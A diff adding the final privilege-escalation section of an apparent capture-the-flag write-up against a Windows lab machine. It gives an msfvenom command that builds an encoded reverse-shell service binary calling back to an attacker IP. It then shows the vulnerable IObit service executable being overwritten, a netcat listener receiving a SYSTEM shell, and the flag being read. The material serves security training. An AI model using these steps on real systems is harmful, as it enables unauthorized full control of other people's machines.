@@ -285,3 +285,102 @@ Check          : Unquoted Service Paths
 
 > Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
 
+
+--- 
+
+```shell
+
+┌──(root㉿kali)-[~]
+└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.152.35 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe-service file: 12288 bytes
+Saved as: Advanced.exe
+```
+
+> msfconsole: finding the path of vulnerable service. 
+
+```shell
+PS > sc.exe qc AdvancedSystemCareService9
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+        LOAD_ORDER_GROUP   : System Reserved
+        TAG                : 1
+        DISPLAY_NAME       : Advanced SystemCare Service 9
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+> Then, we stop the service, and replace it with our own malicious binary - Advanced.exe (Before doing this, use `nc -lvnp 4443` in another tab):
+
+```shell
+PS > sc.exe stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+PS > Copy-Item -Force .\Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+PS > sc.exe start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1784
+        FLAGS              :
+```
+
+> We get the shell:
+> 
+```
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [192.168.152.35] from (UNKNOWN) [10.128.149.9] 49451
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  12:05 PM    <DIR>          .
+10/12/2020  12:05 PM    <DIR>          ..
+10/12/2020  12:05 PM             1,528 activation.ps1
+09/27/2019  05:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,157,612,032 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+9af5f314f57607c00fd09803a587db80
+C:\Users\Administrator\Desktop>
+```
+
+Finishing the CTF. 
